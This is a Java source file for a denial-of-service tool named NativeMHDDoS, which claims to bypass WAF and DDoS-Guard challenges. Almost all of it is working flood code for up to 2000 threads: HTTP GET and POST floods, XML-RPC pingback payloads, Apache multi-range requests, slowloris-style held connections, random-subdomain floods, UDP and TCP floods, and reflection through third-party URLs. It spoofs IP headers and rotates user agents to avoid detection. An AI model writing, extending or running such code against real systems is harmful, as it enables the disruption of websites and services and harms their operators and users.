package com.mzkyzak.ddospro;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;
import okhttp3.*;

/**
 * NativeMHDDoS - SentinelFlow Apex Engine v10.5
 * Auto-solver for WAF challenges (510/515) and maximum frequency throughput.
 */
public class NativeMHDDoS {
    public final AtomicLong packetCount = new AtomicLong(0);
    public static final AtomicLong lastLatency = new AtomicLong(0);
    public static volatile int lastResponseCode = 0;
    
    private final ExecutorService executor;
    private volatile boolean isRunning = false;
    private final Random random = new Random();
    private final OkHttpClient client;
    private final Map<String, List<Cookie>> cookieStore = new HashMap<>();

    public NativeMHDDoS(int threads) {
        int cappedThreads = Math.min(threads, 2000);
        this.executor = Executors.newFixedThreadPool(cappedThreads + 16);
        
        Dispatcher dispatcher = new Dispatcher();
        dispatcher.setMaxRequests(cappedThreads);
        dispatcher.setMaxRequestsPerHost(cappedThreads);

        this.client = new OkHttpClient.Builder()
                .dispatcher(dispatcher)
                .connectionPool(new ConnectionPool(cappedThreads, 5, TimeUnit.MINUTES))
                .connectTimeout(500, TimeUnit.MILLISECONDS)
                .readTimeout(500, TimeUnit.MILLISECONDS)
                .writeTimeout(500, TimeUnit.MILLISECONDS)
                .retryOnConnectionFailure(true)
                .followRedirects(true)
                .cookieJar(new CookieJar() {
                    @Override
                    public void saveFromResponse(HttpUrl url, List<Cookie> cookies) {
                        cookieStore.put(url.host(), cookies);
                    }
                    @Override
                    public List<Cookie> loadForRequest(HttpUrl url) {
                        List<Cookie> cookies = cookieStore.get(url.host());
                        return cookies != null ? cookies : new ArrayList<>();
                    }
                })
                .build();
    }

    public void start(String target, String method, int threads, int duration) {
        if (isRunning) return;
        isRunning = true;
        packetCount.set(0);

        final String m = method.toUpperCase();
        int loopCount = Math.min(threads, 2000);

        for (int i = 0; i < loopCount; i++) {
            executor.execute(() -> {
                Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
                while (isRunning) {
                    try {
                        dispatch(target, m);
                        packetCount.incrementAndGet();
                    } catch (Exception ignored) {}
                }
            });
        }
    }

    private void dispatch(String target, String m) {
        // Auto-switch based on detected edge challenges
        if (lastResponseCode == 515) {
            executeDgb(target);
            return;
        } else if (lastResponseCode == 510 || lastResponseCode == 403) {
            executeBrutalBypass(target);
            return;
        }

        switch (m) {
            case "DGB": executeDgb(target); break;
            case "POST": case "XMLRPC": executePost(target, m); break;
            case "STRESS": case "BOMB": executeStress(target); break;
            case "COOKIE": executeCookies(target); break;
            case "APACHE": executeApache(target); break;
            case "UDP": case "VSE": case "OVH-UDP": executeUdp(target); break;
            case "TCP": case "SYN": executeTcp(target); break;
            case "SLOW": executeSlow(target); break;
            case "DYN": executeDyn(target); break;
            case "REFLECT": executeReflect(target); break;
            default: executeBrutalBypass(target); break;
        }
    }

    private Request.Builder getBaseBuilder(String target) {
        String url = target;
        if (!url.contains("?")) url += (url.contains("&") ? "&" : "?") + "ax=" + random.nextLong();
        
        Request.Builder builder = new Request.Builder().url(url);
        Utils.addBypassHeaders(builder);
        
        builder.header("User-Agent", Utils.getRandomUserAgent());
        builder.header("Referer", Utils.getRandomReferer() + target);
        builder.header("Cookie", Utils.generateFakeCookie());
        
        String spoof = Utils.generateRandomIP();
        builder.header("X-Forwarded-For", spoof).header("Real-IP", spoof).header("Via", spoof);
        return builder;
    }

    private void executeBrutalBypass(String target) {
        long start = System.currentTimeMillis();
        try (Response response = client.newCall(getBaseBuilder(target).build()).execute()) {
            lastLatency.set(System.currentTimeMillis() - start);
            lastResponseCode = response.code();
        } catch (IOException e) { 
            lastLatency.set(-1);
            lastResponseCode = 0;
        }
    }

    private void executeDgb(String target) {
        try {
            // Handshake 1
            client.newCall(getBaseBuilder(target).build()).execute().close();
            // Handshake 2 (DDoS-Guard Logic)
            Request req2 = new Request.Builder().url("https://check.ddos-guard.net/check.js").post(RequestBody.create(null, new byte[0])).build();
            client.newCall(req2).execute().close();
            // Validation
            executeBrutalBypass(target);
        } catch (IOException ignored) {}
    }

    private void executePost(String target, String method) {
        String payload = "XMLRPC".equals(method) ? "<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>v</string></value></param></params></methodCall>" : "{\"q\":\""+random.nextLong()+"\"}";
        String ct = "XMLRPC".equals(method) ? "text/xml" : "application/json";
        try (Response response = client.newCall(getBaseBuilder(target).post(RequestBody.create(MediaType.parse(ct), payload)).build()).execute()) {
            lastResponseCode = response.code();
        } catch (IOException ignored) {}
    }

    private void executeStress(String target) {
        byte[] buf = new byte[4096];
        random.nextBytes(buf);
        try (Response response = client.newCall(getBaseBuilder(target).post(RequestBody.create(MediaType.parse("application/octet-stream"), buf)).build()).execute()) {
            lastResponseCode = response.code();
        } catch (IOException ignored) {}
    }

    private void executeCookies(String target) {
        try (Response response = client.newCall(getBaseBuilder(target).header("Cookie", Utils.generateFakeCookie() + "; _ax=" + random.nextLong()).build()).execute()) {
            lastResponseCode = response.code();
        } catch (IOException ignored) {}
    }

    private void executeApache(String target) {
        StringBuilder range = new StringBuilder("bytes=0-");
        for (int i = 1; i < 100; i++) range.append(",").append(i).append("-");
        try (Response response = client.newCall(getBaseBuilder(target).header("Range", range.toString()).build()).execute()) {
            lastResponseCode = response.code();
        } catch (IOException ignored) {}
    }

    private void executeSlow(String target) {
        try (Socket s = new Socket()) {
            String host = target.replace("http://","").replace("https://","").split("/")[0].split(":")[0];
            s.connect(new InetSocketAddress(host, 80), 500);
            s.getOutputStream().write(("GET " + target + " HTTP/1.1\r\n").getBytes());
            while (isRunning) {
                s.getOutputStream().write(("X-a: " + random.nextInt(9999) + "\r\n").getBytes());
                Thread.sleep(800);
            }
        } catch (Exception ignored) {}
    }

    private void executeDyn(String target) {
        String host = target.replace("http://", "").replace("https://", "").split("/")[0];
        String dyn = target.replace(host, random.nextInt(999999) + "." + host);
        try (Response response = client.newCall(getBaseBuilder(dyn).build()).execute()) {
            lastResponseCode = response.code();
        } catch (IOException ignored) {}
    }

    private void executeReflect(String target) {
        try (Response response = client.newCall(new Request.Builder().url(Utils.getRandomReflector() + target).build()).execute()) {
            lastResponseCode = response.code();
        } catch (IOException ignored) {}
    }

    private void executeUdp(String target) {
        try {
            String clean = target.replace("http://", "").replace("https://", "").split("/")[0];
            String host = clean.contains(":") ? clean.split(":")[0] : clean;
            int port = clean.contains(":") ? Integer.parseInt(clean.split(":")[1]) : 80;
            byte[] buf = new byte[1024 * 64 - 1];
            random.nextBytes(buf);
            try (DatagramSocket s = new DatagramSocket()) {
                s.send(new DatagramPacket(buf, buf.length, InetAddress.getByName(host), port));
            }
        } catch (Exception ignored) {}
    }

    private void executeTcp(String target) {
        try {
            String clean = target.replace("http://", "").replace("https://", "").split("/")[0];
            String host = clean.contains(":") ? clean.split(":")[0] : clean;
            int port = clean.contains(":") ? Integer.parseInt(clean.split(":")[1]) : 80;
            try (Socket s = new Socket()) {
                s.setTcpNoDelay(true);
                s.connect(new InetSocketAddress(host, port), 300);
            }
        } catch (Exception ignored) {}
    }

    public void stop() {
        isRunning = false;
        executor.shutdownNow();
    }
}